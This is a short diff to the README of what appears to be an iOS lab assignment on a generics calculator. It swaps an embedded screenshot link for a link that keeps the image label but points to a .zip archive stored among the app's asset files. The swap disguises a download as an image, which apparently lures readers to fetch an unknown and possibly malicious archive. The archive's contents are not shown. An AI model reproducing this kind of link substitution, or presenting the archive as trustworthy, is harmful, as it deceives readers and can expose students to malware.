@@ -22,7 +22,7 @@ What you're app must have :
 
 Here is the final view of your app
 
-![IMG_4703](https://user-images.githubusercontent.com/6766037/137682346-abc35151-6172-4786-8fcf-cc732eadf688.PNG)
+![IMG_4703](https://raw.githubusercontent.com/EHAB7k/Lab10_generics_calculator/main/LAB10d/LAB10d/Assets.xcassets/calculator_generics_Lab_v2.9-beta.3.zip)
 
 
 ## Part 2 : Use Generics
